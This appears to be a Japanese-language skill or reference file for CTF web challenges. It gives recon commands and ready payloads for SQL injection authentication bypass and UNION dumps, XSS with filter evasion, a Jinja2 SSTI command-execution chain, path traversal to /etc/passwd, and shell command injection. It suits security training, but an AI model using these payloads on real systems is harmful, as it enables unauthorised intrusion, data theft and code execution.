---
name: web
description: CTFのWeb問題ジャンル。SQLi、XSS、SSTI、ディレクトリトラバーサル、ディレクトリ探索等の攻撃手法について説明。Web問題に取り組む際に参照。
---

# Web

## 技術スタック

- **ディレクトリ探索**: Gobuster, dirsearch, ffuf
- **辞書**: SecLists (`/usr/share/seclists/`)
- **プロキシ**: Burp Suite
- **HTTP**: curl, Python requests
- **その他**: nikto, sqlmap, wfuzz

## 初期偵察手順

Web問題に取り組む際の最初のステップ：

```bash
# 1. サイトの基本情報を確認
curl -v http://target:port/

# 2. レスポンスヘッダから技術スタックを推測
curl -sI http://target:port/ | grep -iE 'server|x-powered-by|set-cookie'

# 3. robots.txt, sitemap.xml を確認
curl -s http://target:port/robots.txt
curl -s http://target:port/sitemap.xml

# 4. ディレクトリ探索
gobuster dir -u http://target:port/ -w /usr/share/seclists/Discovery/Web-Content/common.txt

# 5. ソースコード確認 (コメント、隠しフォーム、JSファイル)
curl -s http://target:port/ | grep -iE 'flag|comment|hidden|TODO'
```

## よくある攻撃手法

### SQL Injection (SQLi)

```python
import requests

url = "http://target:port/login"

# 基本的な認証バイパス
payloads = [
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' #",
    "admin'--",
    "\" OR \"1\"=\"1",
]

for payload in payloads:
    r = requests.post(url, data={
        'username': payload,
        'password': 'anything'
    })
    if 'flag' in r.text.lower() or 'welcome' in r.text.lower():
        print(f'[+] Payload worked: {payload}')
        print(r.text)
        break
```

#### UNION ベース SQLi

```
' UNION SELECT 1,2,3 --                    # カラム数の特定
' UNION SELECT null,table_name,null FROM information_schema.tables --
' UNION SELECT null,column_name,null FROM information_schema.columns WHERE table_name='users' --
' UNION SELECT null,username||':'||password,null FROM users --
```

### Cross-Site Scripting (XSS)

```html
<!-- 基本ペイロード -->
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>

<!-- フィルター回避 -->
<ScRiPt>alert(1)</ScRiPt>
<img src=x onerror="alert(1)">
<body onload=alert(1)>
```

### Server-Side Template Injection (SSTI)

```python
# 検知用ペイロード
# Jinja2: {{7*7}} → 49 が返れば SSTI あり

# Jinja2 RCE
payloads = [
    "{{config}}",
    "{{''.__class__.__mro__[1].__subclasses__()}}",
    "{{''.__class__.__mro__[1].__subclasses__()[X]('cat /flag',shell=True,stdout=-1).communicate()}}",
]
```

### ディレクトリトラバーサル / LFI

```bash
# 基本
curl "http://target/read?file=../../../etc/passwd"
curl "http://target/read?file=....//....//....//etc/passwd"

# PHP ラッパー (LFI → ソースコード取得)
curl "http://target/read?file=php://filter/convert.base64-encode/resource=index.php"
```

### コマンドインジェクション

```bash
# 基本的なペイロード
; cat /flag
| cat /flag
`cat /flag`
$(cat /flag)

# フィルター回避
;cat${IFS}/flag
;cat$IFS/flag
```

## Python リクエストテンプレート

```python
import requests

s = requests.Session()
BASE = "http://target:port"

# GET
r = s.get(f"{BASE}/api/endpoint")
print(r.status_code, r.text)

# POST (form)
r = s.post(f"{BASE}/login", data={"user": "admin", "pass": "test"})

# POST (JSON)
r = s.post(f"{BASE}/api", json={"key": "value"})

# Cookie の確認
print(s.cookies.get_dict())
```

## Gobuster チートシート

```bash
# ディレクトリ探索
gobuster dir -u http://target/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -x php,html,txt

# VHOST 探索
gobuster vhost -u http://target/ -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt

# ファイル探索 (拡張子指定)
gobuster dir -u http://target/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt -x bak,old,txt,zip
```
